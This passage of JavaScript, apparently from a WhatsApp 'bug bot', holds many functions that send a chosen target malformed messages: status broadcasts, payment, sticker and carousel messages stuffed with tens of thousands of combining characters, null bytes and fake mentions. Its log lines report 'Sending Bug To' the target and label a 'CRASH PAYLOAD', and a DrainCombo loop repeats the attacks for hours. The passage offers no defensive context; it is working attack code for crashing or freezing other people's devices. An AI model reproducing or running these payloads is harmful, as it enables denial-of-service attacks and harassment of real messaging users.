                                embeddedAction: null
                            }
                        ]
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(
        "status@broadcast",
        {
            groupStatusMessageV2: {
                message: msg.message
            }
        },
        {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }
                    ]
                }
            ]
        }
    );

    await sock.relayMessage(
        "status@broadcast",
        {
            groupStatusMessageV2: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
            ]
        }
    );
}

async function YxGInfoNe(target) {
const Trash = {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "YxG - InfoNeCrash" + "ꦾ".repeat(60000) + "ꦽ".repeat(60000),
        url: "https://stickerPack/" + "ꦾ".repeat(9000),
        address: "Ngangkang" + "ꦾ".repeat(60000) + "ꦽ".repeat(60000),
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true,
            showAdAttribution: true,
            body: "YxG - Ngangkang Ajg" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
            title: "\u0000".repeat(10000),
            sourceUrl: "https://stickerPack/./" + "ꦾ".repeat(10000),
            thumbnailUrl: null,
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(10000),
              mediaType: 2,
              jpegThumbnail: "/9j/8HACE82HSGSI",
              caption: "YxG - Ish Ngeri Nyoo" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
            },
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCD1234567"
            }
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc",
                  mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                  fileName: "-hayy" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                  fileLength: "99999999999",
                  pageCount: -99999,
                  mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                  fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                  fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                  mediaKeyTimestamp: 1748420423,
                  directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc"
                }
              }
            }
          }
        }
      }
    }; 
    await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
  }
  
async function YxGIngm(sock, target) {
 const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
           message: {
               stickerMessage: {
             url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c&mms3=true",
                   fileSha256: "1nmk47DVAUSmXUUJxfOD5X/LwUi0BgJwgmCvOuK3pXI=",
                   fileEncSha256: "LaaBTYFkIZxif2lm2TfSIt9yATBfYd9w86UxehMa4rI=",
                   mediaKey: "7XhMJyn+ss8sVb2qs36Kh9+lrGVwu29d1IO0ZjHa09A=",
                   mimetype: "image/webp",
                   height: 9999,
                   width: 9999,
                   directPath: "/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c",
                   fileLength: "22254",
                   mediaKeyTimestamp: "1761396583",
                   isAnimated: false,
                   stickerSentTs: Date.now(),
                   isAvatar: false,
                   isAiSticker: false,
                   isLottie: false,
                     contextInfo: {
                        participant: target,
                        mentionedJid: [
                          target,
                           ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                          ),
                       ],
                       remoteJid: "X",
                         participant: target,
                         stanzaId: "1234567890ABCDEF",
                         quotedMessage: {
                            paymentInviteMessage: {
                               serviceType: 3,
                               expiryTimestamp: Date.now() + 1814400000
                            },
                         },
                         groupMentions: [
                           {
                             groupJid: "628xxxxxx2345@g.us",
                             groupSubject: "ꦾ".repeat(30000)
                           }
                        ]
                     }
                  }
               }
            }
         }, {});
         
     const Jk = {
       viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "YxG - YanzINFM", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\×10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  const YxG = {
   interactiveResponseMessage: {
          body: {
            text: "𝐘𝐱𝐆 - 𝐄𝐧𝐝. . .",
            format: "EXTENTION_1",
          },
          nativeFlowResponseMessage: {
            name: "review_and_pay",
            paramsJson: "\x10".repeat(5000),
            version: 4,
          },
          contextInfo: {
            participant: target,
            stanzaId: "status@broadcast",
            mentionedJid: ["181818181818@s.whatsapp.net"],
            forwardingScore: 888,
            isForwarded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: "111111111111@s.whatsapp.net",
            },
            quotedMessage: {
              callLogMessage: {
                isVideo: true,
                callOutCome: 1,
                duration: 135,
                participantIds: [],
              },
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "1@newsletter",
              newsletterName: "InfoNe YxG",
              contentType: "UPDATE",
              serverMessageId: 2,
             }
           }
         }
       };

for (const msg of [msg, Jk, YxG]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.red(`YxG - Informan Off ☠️ Sending Bug To ${target} Ampas Device Nya`));
  }
}

async function crashGP(jidx) {
await sock.relayMessage(jidx, {
  "interactiveMessage": {
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"${'\u0000'.repeat(50000)}\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`
          }
        ]
      }
    }
  }, {});
}

async function DrainCombo(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
       }

        try {
    if (count < 400) {
        await Promise.all([
         delayhard2025(sock, target, mention), 
         Blzr(target),
         SaturnHere(target),
        ]);
        console.log(chalk.blue(`XPLOITIFY DRAIN (API) ${count}/400 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.green(`✅ Success Sending 500 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 400 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 100);
}
};

sendNext();

}

async function CrashInvisble(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "( 🍁 ) -Theshi🐉",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "RilzX7",
                address: "RilzX7",
              },
            },
            body: {
              text: "( 🍁 ) -Theshi🐉",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function wolkercrash(target) {
  try {
    const CrashUrl = "https://files.catbox.moe/917qhz.jpg";
    const abim1 = "ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ" + "៝𑇂𑆵𑆴𑆿".repeat(5000);
    const abim2 = "ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ៝ោ" + "៝𑇂𑆵𑆴𑆿".repeat(3000);

    const msgTemplate = (abimText) => ({
      viewOnceMessage: {
        message: {
          extendedTextMessage: { 
            text: abimText,
            matchedText: "ᝯׁ֒ᨵׁׅׅ ҉҈⃝⃞abim",
            description: abimText, 
            title: abimText, 
            previewType: "NONE",
            jpegThumbnail: CrashUrl
          },
          externalAdReply: {
            title: "ꦾ".repeat(8000),
            body: "hama hama kontol🤭",
            thumbnailUrl: CrashUrl,
            mediaType: 1,
            mediaUrl: "https://pornhub.com",
            sourceUrl: "https://pornhub.com"
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: abimText },
              { name: "call_permission_request", buttonParamsJson: "៝𑇂𑆵𑆴𑆿".repeat(7000) },
              { name: "address_message", buttonParamsJson: "\u0000".repeat(4000) },
              { name: "call_permission_request", buttonParamsJson: abimText }
            ],
            messageParamsJson: "{{".repeat(9000)
          }
        }
      }
    });

    for (const abimText of [abim1, abim2]) {  
      const msg = msgTemplate(abimText);
      await sock.relayMessage(target, msg, {
        messageId: "random-id-" + Date.now(),
        participant: { jid: target }
      });
    }

    console.log(`Wolker  Your Devices 🤍 Sending Bug To ${target} suksesfull`);
  } catch (e) {
    console.error(e);
  }
}

async function fcbeta(target) {
  let xploitgsl = JSON.stringify({
    status: true,
    criador: " Zyxzo Sec",
    resultado: {
      type: "md",
      ws: {
        _events: {
          "CB:ib,,dirty": ["Array"]
        },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: {
            Object: "authData"
          },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: {
            Object: "transactionOptsData"
          },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: {
            Object: "appStateMacData"
          },
          mobile: true
        }
      }
    }
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: " Zyxzo Not Found ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: xploitgsl,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: xploitgsl + "{",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: {
      jid: target
    },
  });
}

async function TrueIos(target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        locationMessage: {
          degreesLatitude: 999.27838,
          degreesLongitude: -127.929,
          name: `X` + "𑇂𑆵𑆴𑆿".repeat(60000),
          url: null,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, z) => `628${z + 1}@s.whatsapp.net`
            ),
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "Video",
                jpegThumbnail: null,
                caption: "𑇂𑆵𑆴𑆿".repeat(60000)
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function invisotax(isTarget) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`)); 
  const OtaxApiDelay = JSON.stringify({
        Webthumb: "https://ꦾ.com/".repeat(10000),
        name: "single_select",
        params: {
            title: "\u200C".repeat(90000),
            sections: [
                {
                    title: "\u200C".repeat(90000),
                    rows: Array(50).fill().map(() => ({
                        title: "\u200D".repeat(90000),
                        description: "\u200D".repeat(90000),
                        rowId: "\u200D".repeat(90000)
                    }))
                }
            ],
            contextInfo: {
                mentionedJid: [target],
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "CRASH PAYLOAD",
                    body: "OTAX XJAV Hd" + "\u200E".repeat(90000),
                    mediaType: 2,
                    thumbnailUrl: "https://files.catbox.moe/420bpx.jpg",
                    sourceUrl: WebThumb
                }
            }
        }
    });
     const msg = generateWAMessageFromContent("status@broadcast",OtaxApiDelay, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: isTarget },
                    content: undefined
                }]
            }]
        }]
    }, {
        participant: isTarget
    });
}

async function protocolbug8(target, mention) {
  const photo = {
    image: imgCrL,
    caption: "༽ 𝐇𝐀𝐃𝐄𝐒 𝐈𝐍 𝐘𝐎𝐔𝐑 𝐀𝐑𝐄𝐀 ༼"
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 100, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 100; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(target, photo, {
      upload: sock.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Tama Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function R8Abim(target) {
  try {
    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            interactiveResponseMessage: {
              header: {
                interactiveButtons: [],
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(90000),
                buttons: [
                  { name: "payment_method", buttonParamsJson: {} },
                  { name: "payment_info", buttonParamsJson: {} },
                  { name: "payment_settings", buttonParamsJson: {} },
                  { name: "review_and_pay", buttonParamsJson: {} },
                  { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(90080) },
                  { name: "cta_url", buttonParamsJson: "\u0000".repeat(96000) },
                  { name: "cta_call", buttonParamsJson: "\u0000".repeat(9900) },
                  { name: "cta_copy", buttonParamsJson: "\u0003".repeat(8000) },
                  { name: "cta_reminder", buttonParamsJson: "\u0003".repeat(76000) },
                  { name: "cta_cancel_reminder", buttonParamsJson: "\u0003".repeat(95000) },
                  { name: "address_message", buttonParamsJson: "\u0003".repeat(95000) },
                  { name: "send_location", buttonParamsJson: "\u0003".repeat(98000) },
                  { name: "quick_reply", buttonParamsJson: "\u0003".repeat(90050) },
                  { name: "mpm", buttonParamsJson: "\u0003".repeat(97000) },
                ],
                version: 3,
              },
              nativeFlowMessage: {
                messageParamsJson: "{}",
                buttons: [
                  {
                    businessMessageForwardInfo: {
                      businessOwnerJid: "13135550002@s.whatsapp.net",
                    },
                    name: "payment_method",
                    buttonParamsJson: {
                      reference_id: null,
                      payment_method: "\u0010".repeat(80000),
                      payment_timestamp: null,
                      share_payment_status: true,
                    },
                  },
                  { name: "payment_method", buttonParamsJson: {} },
                  { name: "payment_info", buttonParamsJson: {} },
                  { name: "payment_settings", buttonParamsJson: {} },
                  { name: "review_and_pay", buttonParamsJson: {} },
                ],
              },
            },
          },
        },
      },
    };

    const msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            interactiveResponseMessage: {
              body: {
                text: "⏤>ADA ABIM JANGAN⃟ ི꒦ LARI" + "ꦾ".repeat(95000),
              },
              nativeFlowMessage: {
                buttons: [
                  { name: "single_select", buttonParamsJson: "\u0000".repeat(90000) },
                  { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(98000) },
                  { name: "cta_url", buttonParamsJson: "\u0000".repeat(90000) },
                  { name: "cta_call", buttonParamsJson: "\u0000".repeat(98000) },
                  { name: "cta_copy", buttonParamsJson: "\u0003".repeat(5000) },
                  { name: "cta_reminder", buttonParamsJson: "\u0003".repeat(9000) },
                  { name: "cta_cancel_reminder", buttonParamsJson: "\u0003".repeat(95000) },
                  { name: "address_message", buttonParamsJson: "\u0003".repeat(9500) },
                  { name: "send_location", buttonParamsJson: "\u0003".repeat(9900) },
                  { name: "quick_reply", buttonParamsJson: "\u0003".repeat(80000) },
                  { name: "mpm", buttonParamsJson: "\u0003".repeat(95000) },
                ],
              },
            },
          },
        },
      },
    };

    for (const msg of [msg1, msg2]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                  },
                ],
              },
            ],
          },
        ],
      });
    }

    console.log(`[ Wolker Sending To ${target} suksesfull 🧪 ]`);
  } catch (e) {
    console.error(e);
  }
}

async function amountOne(target) {
  const paymentMessage = {
    requestPaymentMessage: {
      amount: {
        value: 1,
        offset: 0,
        currencyCodeIso4217: "IDR",
        requestFrom: target,
        expiryTimestamp: Date.now()
      },
      contextInfo: {
        externalAdReply: {
          title: null,
          body: "\0",
          mimetype: "audio/mpeg",
          caption: "\0",
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  };

  await sock.relayMessage(target, paymentMessage, {
    participant: { jid: target }
  });
}

async function BlankNewsletterXSticker(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
       message: {
         newsletterAdminInviteMessage: {
          newsletterJid: "999999999@newsletter",
          newsletterName: "#Invoke" + "ꦽ".repeat(25000),
          jpegThumbnail: "",
          caption: "#BreIniHastagBukan!!?" + "ꦽ".repeat(15000),
          inviteExpiration: Date.now() + 1814400000, 
           stickerMessage: {
             fileSha256: "A".repeat(1000),
             fileEncSha256: "B".repeat(1000),
             mediaKey: "C".repeat(1000),
             mimetype: "image/webp",
             height: 999999,
             width: 999999,
             fileLength: 999999,
             isAnimated: true,
             url: "A".repeat(10000),
             directPath: "B".repeat(10000),
             mediaKeyTimestamp: '1'.repeat(1000),
             stickerSentTs: Date.now(),
             contextInfo: {
               mentionedJid: [
                 ...Array.from({ length: 2000}, () => "1" + Math.floor(Math.random() *  999999) + "@s.whatsapp.net"
                ),
              ],
            },
          },
          body: {
            text: "𝙒𝙝𝙞𝙩̶e𝙇𝙤̶t𝙪𝙨̶s" + "ꦽ".repeat(25000) + "ꦽ".repeat(15000),
            hasMediaAttachment: true,
          },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "catalog_message",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "review_order",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "send_location",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "mpm",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "single_select",
                  buttonParamsJson: penambah(),
                },
              ],
            },
          },
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
    
    console.log(chalk.green(`Succes Send BlankNewsletterXSticker To ${target}`));
  }
  
async function MonkeyDelay(target) {
const msg = {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "OmOsaka Is Commback" + "ꦽ".repeat(696),
format: "EXTENSIONS_1",
},
nativeFlowResponseMessage: {
name: "galaxy_message",
paramsJson: `{"screen_2_OptIn_0":true,"screen_2_OptIn_1":true,"screen_1_Dropdown_0":"4𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ","screen_1_DatePicker_1":"1028995200000","screen_1_TextInput_2":"DelayHard","screen_1_TextInput_3":"94643116","screen_0_TextInput_0":"#3izxvelzExerc1st. ‌${"\u0000".repeat(1045000)}","screen_0_TextInput_1":"INFINITE","screen_0_Dropdown_2":"001-Grimgar","screen_0_RadioButtonsGroup_3":"0_true","flow_token":"AQAAAAACS5FpgQ_cAAAAAE0QI3s."}`,
version: 3,
},
},
},
},
};

await sock.relayMessage("status@broadcast", msg, {
messageId: Date.now().toString(),
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: [] }
]
}
]
}
]
});

console.log("Success Send Bug MonkeyDelay🫥");
await new Promise(resolve => setTimeout(resolve, 2000));
}

async function BlankCarousel(target) {
  let cards = [];
  let push = [];
  
  let buttons = [
    {
      name: "single_select",
      buttonParamsJson: "",
    },
  ];
  
  for (let i = 0; i < 2000; i++) {
    buttons.push(
      {
        name: "send_location",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
          flow_cta_version_call: 3.0,
        }),
      },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
          flow_cta_version_call: 3.0,
        }),
      },
      {
        name: "galaxy_message",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
          flow_cta_version_call: 3.0,
        }),
      }
    );
  }
  
  let mpm = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "1nmk47DVAUSmXUUJxfOD5X/LwUi0BgJwgmCvOuK3pXI=",
          fileEncSha256: "LaaBTYFkIZxif2lm2TfSIt9yATBfYd9w86UxehMa4rI=",
          mediaKey: "7XhMJyn+ss8sVb2qs36Kh9+lrGVwu29d1IO0ZjHa09A=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c",
          fileLength: "22254",
          mediaKeyTimestamp: "1761396583",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
            },
          },
        },
        body: {
          text: "You Jelek Jadi Aku Bug" + "ꦽ".repeat(25000) + "ꦽ".repeat(15000),
        },
        nativeFlowMessage: {
         messageParamsJson: "{[".repeat(10000),
          buttons: buttons,
        },
        quotedMessage: {
          locationMessage: {
            degreesLatitude: 999999999,
            degreesLongitude: -999999999,
             name: '{'.repeat(15000),
             address: '{'.repeat(15000)
          },
        },
      },
    },
  },
};

 let msg = {
   ephemeralMessage: {
     message: {
       carouselMessage: {
         messageVersion: 2,
           cards: [
            {
              header: {
                imageMessage: {
                url: "",
              },
            },
          },
        ],
      },
      quotedMessage: {
        paymentInviteMessage: {
           serviceType: 3,
           expiryTimestamp: Date.now() + 1814400000
        },
      },
    },
  },
};

  const msg1 = generateWAMessageFromContent(target, mpm, {});
  
  await sock.relayMessage(target, msg1, {
    messageId: null,
    participant: { jid: target },
  });
  
  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target },
  });
  
  console.log(chalk.green("Succes Sending Bug BlankXDelay Carousel"));
}

async function VampireNewUi(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙸𝚂 𝙱𝙰𝙲𝙺̤\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "\u0003",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function IosVisibleExp(target) {
    const TrashIosx =
        ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " +
        "𑇂𑆵𑆴𑆿";

    await sock.sendMessage(
        target,
        {
            text: "👁‍🗨⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️ ✩ > https://t.me/xrelly" + TrashIosx + "𑇂𑆵𑆴𑆿".repeat(15000),
            contextInfo: {
                externalAdReply: {
                    title:
                        "({[🧪⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️✩ ▻ ]})" +
                        "𑇂𑆵𑆴𑆿".repeat(15000),

                    body:
                        `🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰ𝘅𝗿𝗹.𝛆𝛘𞥆𝛆 ✩ ▻` +
                        TrashIosx +
                        "𑇂𑆵𑆴𑆿".repeat(15000),

                    previewType: "PHOTO",
                    remoteJid: "X",
                    conversionSource: " X ",
                    conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
